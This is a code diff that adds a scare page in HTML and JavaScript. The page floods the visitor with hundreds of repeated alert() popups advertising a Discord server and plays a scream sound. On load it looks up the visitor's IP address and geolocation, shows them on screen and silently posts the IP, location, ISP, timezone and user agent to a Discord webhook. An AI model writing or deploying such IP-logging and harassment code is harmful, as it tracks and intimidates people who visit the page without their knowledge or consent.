+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        alert("Dante is Here Get Out , Discord.gg/88h");
+        
+
+
+    }
+});
+
+        // تحميل الخلفيات والروابط
+        document.body.style.backgroundImage = `url('${dante_dis_88h_BackGround_Img}')`;
+        document.getElementById("img69").src = dante_dis_88h_Img_69;
+        document.getElementById("loading_img").src = dante_dis_88h_loading_img;
+        document.getElementById("Text_loadingScreen").textContent = dante_dis_88h_loading_Text;
+        document.getElementById("Text_Title").textContent = dante_dis_88h_DanteIsHere;
+        document.getElementById("Text_Title2").textContent = dante_dis_88h_DanteIsHere2;
+        document.getElementById("scream").src = dante_dis_88h_screamSound;
+
+        // شاشة التحميل
+        window.onload = function () {
+            setTimeout(() => {
+                document.getElementById('loading').classList.add('hide-loading');
+                document.getElementById('mainContent').style.display = 'block';
+                playSound();
+                fetchIPAddress();
+                fetchLocalAddress();
+                sendVisitorInfo();
+            }, 1000);
+        };
+
+        function playSound() {
+            const audio = document.getElementById("scream");
+            audio.play().catch(() => {});
+        }
+
+        // إحضار IP من ipify
+        async function fetchIPAddress() {
+            try {
+                let response = await fetch('https://api.ipify.org?format=json');
+                let data = await response.json();
+                document.getElementById('ip-address').textContent = `Your IP: ${data.ip}`;
+            } catch {
+                document.getElementById('ip-address').textContent = 'Fuck You';
+            }
+        }
+
+        // إحضار بيانات الموقع من ipinfo
+        async function fetchLocalAddress() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ip = (await ipResponse.json()).ip;
+
+                const ipInfo = await fetch(`https://ipinfo.io/${ip}/json`);
+                const data = await ipInfo.json();
+                const now = new Date().toLocaleString();
+
+                document.getElementById('local-address').textContent = `Your Local: ${data.loc}`;
+                document.getElementById('city-address').textContent = `Your City: ${data.city}`;
+                document.getElementById('Country-address').textContent = `Your Country: ${data.country}`;
+                document.getElementById('org-address').textContent = `Your Org: ${data.org}`;
+                document.getElementById('dateTime-address').textContent = `Date Time: ${now}`;
+            } catch {
+                document.getElementById('local-address').textContent = 'Fuck You';
+                document.getElementById('city-address').textContent = 'Fuck You';
+            }
+        }
+
+        // إرسال البيانات إلى Discord Webhook
+        async function sendVisitorInfo() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ip = (await ipRes.json()).ip;
+                const infoRes = await fetch(`https://ipinfo.io/${ip}/json`);
+                const info = await infoRes.json();
+                const userAgent = navigator.userAgent;
+                const dateTime = new Date().toLocaleString();
+
+                await fetch(discord_Webhook, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "**Config IP : [ https://ipinfo.org ]**",
+                        embeds: [{
+                            title: "Visitor Details",
+                            fields: [
+                                { name: "IP Address", value: ip, inline: true },
+                                { name: "Country", value: info.country, inline: true },
+                                { name: "City", value: info.city || "Unknown", inline: true },
+                                { name: "org", value: info.org || "Unknown", inline: true },
+                                { name: "loc", value: info.loc || "Unknown", inline: true },
+                                { name: "timezone", value: info.timezone || "Unknown", inline: true },
+                                { name: "Region", value: info.region || "Unknown", inline: true },
+                                { name: "User Agent", value: userAgent, inline: false },
+                                { name: "Date & Time", value: dateTime, inline: false }
+                            ],
+                            color: 3066993
+                        }]
+                    })
+                });
+            } catch (e) {
+                console.error('Webhook error:', e);
+            }
+        }
+    </script>
+</body>
+</html>
